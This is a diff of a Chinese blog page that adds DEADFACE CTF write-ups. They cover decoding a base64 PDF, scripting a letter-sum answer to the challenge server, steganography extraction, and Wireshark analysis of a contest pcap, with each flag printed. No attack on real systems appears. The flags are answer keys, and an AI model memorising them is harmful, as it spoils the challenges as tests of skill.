+fZKeJupO5HlI72m/kEiRDlOoECqFPEAERAAjZw7XuShWNJbmZ4CCouqIqANgQNQLS7VoMlTmaBJS
+NKpnIVXgyxlxrqiqidMxqQmEomgNkbYYg1mYakaICqccAi0BAEEAIcmcAgoaaIA3RFEjGMYQv//S
+1VjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMI
+RjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIX/2Q0K
+ZW5kc3RyZWFtDWVuZG9iag0xIDAgb2JqDTw8L0ZpbHRlci9GbGF0ZURlY29kZS9GaXJzdCAxNC9M
+ZW5ndGggMTI2L04gMy9UeXBlL09ialN0bT4+c3RyZWFtDQpo3jJTMFAwVzCxVLBQsDRSsLHRd84v
+zStRMNR3yywqLgFKGSgE6fskwpkhlQWp+v6lJTmZeanFdnZADY5ArSCZgMSiVKBOM4iyzJKcVA2n
+nMS8bIWAxPRUTbBSl2hDY7B0RGQUyF6gjXmlOTmx+sH67vkh+XZ2AAEGAKanJzYNCmVuZHN0cmVh
+bQ1lbmRvYmoNMiAwIG9iag08PC9MZW5ndGggMzIwNS9TdWJ0eXBlL1hNTC9UeXBlL01ldGFkYXRh
+Pj5zdHJlYW0NCjw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr
+YzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl
+IFhNUCBDb3JlIDUuNi1jMDE3IDkxLjE2NDQ2NCwgMjAyMC8wNi8xNS0xMDoyMDowNSAgICAgICAg
+Ij4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk
+Zi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAg
+ICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAg
+ICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAg
+IHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAg
+ICB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPgogICAgICAgICA8eG1w
+Ok1vZGlmeURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0wNTowMDwveG1wOk1vZGlmeURhdGU+CiAg
+ICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTA3LTE3VDIwOjU1OjIwLTA1OjAwPC94bXA6Q3Jl
+YXRlRGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0w
+NTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBB
+Y3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC94bXA6Q3JlYXRvclRvb2w+CiAgICAg
+ICAgIDxkYzpmb3JtYXQ+YXBwbGljYXRpb24vcGRmPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx4bXBN
+TTpEb2N1bWVudElEPnV1aWQ6ODA3OGUyYWUtZDc4Yy00ZjNlLWFkZWUtMGFkM2NiMzU3ZjM1PC94
+bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD51dWlkOjc1ZjNiNTNi
+LTZkYTgtNGNhNi1hYzZkLTVlOGU2NGY1NjMyODwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAg
+PHBkZjpQcm9kdWNlcj5BZG9iZSBBY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC9w
+ZGY6UHJvZHVjZXI+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4
+bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgCjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0cmVhbQ1lbmRvYmoNMyAwIG9iag08PC9GaWx0
+ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNC9MZW5ndGggNDkvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0N
+CmjeslQwULCx0XfOL80rUTDU985MKY42NAYKBsXqh1QWpOoHJKanFtvZAQQYAOA1C68NCmVuZHN0
+cmVhbQ1lbmRvYmoNNCAwIG9iag08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNS9MZW5ndGgg
+MTI0L04gMS9UeXBlL09ialN0bT4+c3RyZWFtDQpo3pTMsQrCMBRG4Ve5W5Oh7Z+rl6qUQmlWwQfo
+kjQZuvRCiO+vILg4uZ/zORBoHPul5FB3PXyo2fgbgx0GNzBEGC2kARr7qbSYOWnMNG9FY6j0KEp+
+odWcuI17XS2x66RjQC62v2v6Ra98/qLvPT23/Jc6TS8BBgAluTGrDQplbmRzdHJlYW0NZW5kb2Jq
+DTUgMCBvYmoNPDwvRGVjb2RlUGFybXM8PC9Db2x1bW5zIDQvUHJlZGljdG9yIDEyPj4vRmlsdGVy
+L0ZsYXRlRGVjb2RlL0lEWzwwMkYzNTg5OTNDMUQxNDRFOENGNkQyRjJBMjc5QUM0Rj48MUVCMkZC
+MTkyOTFEQ0Q0RDk4Mzk3NzE1OUM5QTc1OTY+XS9JbmZvIDEwIDAgUi9MZW5ndGggNDgvUm9vdCAx
+MiAwIFIvU2l6ZSAxMS9UeXBlL1hSZWYvV1sxIDIgMV0+PnN0cmVhbQ0KaN5iYgACJkaFKAYmBsY7
+QIL3EpBg6AVxbwIlLk4GcRkYYQTTPyDByAAQYACsTAYdDQplbmRzdHJlYW0NZW5kb2JqDXN0YXJ0
+eHJlZg0KMTE2DQolJUVPRg0K
+</code></pre>
+<p>在本地解码,保存至<code>flag.pdf</code></p>
+<pre><code class="shell">~$ base64 -d encoded &gt; flag.pdf
+</code></pre>
+<p><strong>flag:</strong><code>flag{deM0nn3_dat4_4_us}</code></p>
+<h1 id="The-Count"><a href="#The-Count" class="headerlink" title="The Count"></a>The Count</h1><p><em>Apparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He’s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as <code>flag{SHA256_hash}</code>.</em></p>
+<p><em><a href="https://ghosttown.deadface.io/t/what-programming-needs-are-there/56/4" target="_blank" rel="noopener">Link to Thread</a></em></p>
+<p><em>code.deadface.io:50000</em></p>
+<hr>
+<p>使用nc命令连接服务器</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ nc code.deadface.io 50000
+DEADFACE gatekeeper: Let us see how good your programming skills are.
+If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:
+
+ You have 5 seconds to give me an answer.
+
+Your word is: tightfisted
+Too slow!! Word has been reset!
+
+</code></pre>
+<p>我们取每一位字符的ASCII码后减去97,求和即可</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+p = remote(<span class="string">'code.deadface.io'</span>, <span class="number">50000</span>)
+
+x = p.recvline_contains(<span class="string">b'Your word'</span>)
+word = x.decode().rsplit(<span class="string">':'</span>)[<span class="number">-1</span>].strip()
+count = sum([ord(x)<span class="number">-97</span> <span class="keyword">for</span> x <span class="keyword">in</span> word])
+p.send(str(count).encode())
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+
+
+</code></pre>
+<p><strong>flag:</strong><code>flag{d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944}</code></p>
+<h1 id="Behind-the-Curtain"><a href="#Behind-the-Curtain" class="headerlink" title="Behind the Curtain"></a>Behind the Curtain</h1><p><em>This image was intercepted from Ghost Town. We think Donnell has hidden information here, but there doesn’t seem to be anything special about the image. Can you help find the hidden information? Submit the flag as flag{this-is-the-flag}.</em></p>
+<p><em><a href="https://tinyurl.com/26fd4pbs" target="_blank" rel="noopener">Link to Image</a></em></p>
+<p><em>SHA1: 29141eea42be29f8fa28a9a1cc5e5118e63577b2</em></p>
+<hr>
+<p>使用<code>Stegsolve</code>打开图片,选择<code>Frame Browser</code>,在Frame 2即可看到flag<br><img data-src="../../CTF/DEADFACECTF/Steganography/images/Behind_the_Curtain.png" alt="Behind the Curtain"></p>
+<p><strong>flag:</strong><code>flag{L3t_m3_in}</code></p>
+<h1 id="Scary-Bunny"><a href="#Scary-Bunny" class="headerlink" title="Scary Bunny"></a>Scary Bunny</h1><p><em>What could be inside this creepy rabbit?</em></p>
+<p><em><a href="https://tinyurl.com/4csyne6s" target="_blank" rel="noopener">Download image</a></em></p>
+<p><em>SHA1: 7ab2d9b1986ae12b780d0a2124a3adce6ed4c4e1</em></p>
+<hr>
+<p>使用<code>steghide info</code>查看图片隐写信息</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ steghide info bunny.jpg
+&quot;bunny.jpg&quot;:
+  format: jpeg
+  capacity: 2.7 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase:
+  embedded file &quot;steganopayload730241.txt&quot;:
+    size: 13.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+</code></pre>
+<p>使用<code>steghide extract</code>提取隐写的文件<code>steganopayload730241.txt</code></p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ steghide extract -sf bunny.jpg
+Enter passphrase:
+the file &quot;steganopayload730241.txt&quot; does already exist. overwrite ? (y/n) y
+wrote extracted data to &quot;steganopayload730241.txt&quot;.
+
+╭─ ~/CTF/DEADFACE
+╰─$ cat steganopayload730241.txt
+flag{Carr0t}
+</code></pre>
+<p><strong>flag:</strong><code>flag{Carr0t}</code></p>
+<h1 id="Send-in-the-Clowns"><a href="#Send-in-the-Clowns" class="headerlink" title="Send in the Clowns"></a>Send in the Clowns</h1><p><em>There is a secret hidden somewhere in this image. Can you find it? Submit the flag as flag{this-is-the-flag}.</em></p>
+<p><em><a href="https://tinyurl.com/y9xjz7b4" target="_blank" rel="noopener">Link to Image</a><br>SHA1: 74eaae618bf508ef2715533bfdff3153dd996e89</em></p>
+<hr>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ strings steg02.jpg |grep flag
+flag{s3nd_in_the_kl0wns}
+</code></pre>
+<p><strong>flag:</strong><code>flag{s3nd_in_the_kl0wns}</code></p>
+<h1 id="V0icE"><a href="#V0icE" class="headerlink" title="V0icE"></a>V0icE</h1><p><em>A friend of mine sent me an audio file which supposes to tell me the time of our night out meeting, but I can’t comprehend the voice in the audio file. Can you help me figure it out? I want to hang out with my friends.</em></p>
+<p><em><a href="https://tinyurl.com/2sa56kbk" target="_blank" rel="noopener">Download file</a></em></p>
+<p><em>SHA1:3173700e9ba2f062a18707b375fac61049310413</em></p>
+<hr>
+<p>用<a href="https://www.sonicvisualiser.org/download.html" target="_blank" rel="noopener">Sonic Visualiser</a>打开<code>midnight.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>-&gt;<code>midnight.wav: All Channels Mixed</code></p>
+<p><img data-src="../../CTF/DEADFACECTF/Steganography/images/V0icE_01.png" alt="V0icE"></p>
+<p>放大后即可看到隐藏在频谱图的flag</p>
+<p><img data-src="../../CTF/DEADFACECTF/Steganography/images/V0icE_02.png" alt="V0icE"></p>
+<p><strong>flag:</strong><code>flag{1257}</code></p>
+<h1 id="A-Warning"><a href="#A-Warning" class="headerlink" title="A Warning"></a>A Warning</h1><p><em>Luciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message.</em></p>
+<p><em>One of them says: “Stay away from Lytton Labs… you have been warned.”</em></p>
+<p><em>To find the flag, find the message. You’ll know it when you see it. Submit the flag as <code>flag{flag-goes-here}</code>.</em></p>
+<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
+<hr>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索“warning”,找到一个请求<code>da-warning-message.jpg</code>的HTTP请求</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning.png" alt="A-Warning"></p>
+<p>找到该请求对应响应的数据包(16050),对着”JPEG File Interchange Format”右键,选择”显示分组字节”,即可看到flag</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-02.png" alt="image-20211106204519981"></p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-03.png" alt="image-20211106205413070"></p>
+<p><strong>flag:</strong><code>flag{angels-fear-to-tread}</code></p>
+<h1 id="Monster-from-the-Machine"><a href="#Monster-from-the-Machine" class="headerlink" title="Monster from the Machine"></a>Monster from the Machine</h1><p><em>Our person on the “inside” of Ghost Town was able to plant a packet sniffing device on Luciafer’s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in.</em></p>
+<p><em>We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack.</em></p>
+<p><em>To gather some information on the victim, investigate the victim’s computer activity. The “victim” was using a search engine to look up a name. Provide the name with standard capitalization: <code>flag{Jerry Seinfeld}</code>.</em></p>
+<p><em><a href="https://tinyurl.com/35a45kc3" target="_blank" rel="noopener">Download file</a></em></p>
+<p><em>SHA1: 6c0caf366dae3e03bcbd7338de0030812536894c</em></p>
+<hr>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,按照<code>HTTP</code>过滤</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine-00.png" alt="Monstrum ex Machine"><br>右键,点击”跟踪流”-&gt;”HTTP流”<br><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine.png" alt="Monstrum ex Machine"></p>
+<p><strong>flag:</strong><code>flag{Charles Geschickter}</code></p>
+<h1 id="Release-the-Crackin’"><a href="#Release-the-Crackin’" class="headerlink" title="Release the Crackin’!"></a>Release the Crackin’!</h1><p><em>Luciafer cracked a password belonging to the victim. Submit the flag as: <code>flag{password}</code>.</em></p>
+<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
+<hr>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索<code>logged</code>,找到正确的密码</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/release_the_crackin.png" alt="Release the Crackin"></p>
+<p><strong>flag:</strong><code>flag{darkangel}</code></p>
+<h1 id="The-SUM-of-All-FEARS"><a href="#The-SUM-of-All-FEARS" class="headerlink" title="The SUM of All FEARS"></a>The SUM of All FEARS</h1><p><em>After hacking a victim’s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively).</em></p>
+<p><em>What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5}</em></p>
+<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
+<hr>
+<p>Luciafer下载了两个具有相同名称的二进制文件(分别以.exe和.bin结尾),两个文件的md5值拼接后即为flag</p>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>分析<code>pcap-challenge-final.pcapng</code>文件,发现是下载了<code>lytton-crypt.exe</code>和<code>lytton-crypt.bin</code>两个文件</p>
+<p>选中一个接收<code>lytton-crypt.exe</code>文件的数据包,右键点击“跟踪流”-&gt;”TCP流”</p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-01.png" alt="lytton-crypt"></p>
+<p>然后点击“另存为”,保存为<code>lytton-crypt.exe</code></p>
+<p><img data-src="../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-02.png" alt="lytton-crypt"></p>
+<p>重复上述步骤,得到<code>lytton-crypt.bin</code>.然后计算两个文件的md5值</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ md5 lytton-crypt.*
+MD5 (lytton-crypt.bin) = 4da8e81ee5b08777871e347a6b296953
+MD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28
+</code></pre>
+<p><strong>flag:</strong><code>flag{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
     
@@ -495,6 +930,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Poor-MEAGAN"><span class="nav-number">1.</span> <span class="nav-text">Poor MEAGAN!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#To-Be-Xor-Not-to-Be"><span class="nav-number">2.</span> <span class="nav-text">To Be Xor Not to Be</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blood-Bash"><span class="nav-number">3.</span> <span class="nav-text">Blood Bash</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blood-Bash-2"><span class="nav-number">4.</span> <span class="nav-text">Blood Bash 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blood-Bash-3"><span class="nav-number">5.</span> <span class="nav-text">Blood Bash 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blood-Bash-4"><span class="nav-number">6.</span> <span class="nav-text">Blood Bash 4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#另一种解法"><span class="nav-number">6.1.</span> <span class="nav-text">另一种解法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Count"><span class="nav-number">7.</span> <span class="nav-text">The Count</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Behind-the-Curtain"><span class="nav-number">8.</span> <span class="nav-text">Behind the Curtain</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Scary-Bunny"><span class="nav-number">9.</span> <span class="nav-text">Scary Bunny</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Send-in-the-Clowns"><span class="nav-number">10.</span> <span class="nav-text">Send in the Clowns</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#V0icE"><span class="nav-number">11.</span> <span class="nav-text">V0icE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#A-Warning"><span class="nav-number">12.</span> <span class="nav-text">A Warning</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Monster-from-the-Machine"><span class="nav-number">13.</span> <span class="nav-text">Monster from the Machine</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Release-the-Crackin’"><span class="nav-number">14.</span> <span class="nav-text">Release the Crackin’!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-SUM-of-All-FEARS"><span class="nav-number">15.</span> <span class="nav-text">The SUM of All FEARS</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -581,13 +1017,13 @@
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">125k</span>
+    <span title="站点总字数">177k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">4:56</span>
 </div>
   <div class="addthis_inline_share_toolbox">
     <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5a73dc9a89a291e2" async="async"></script>
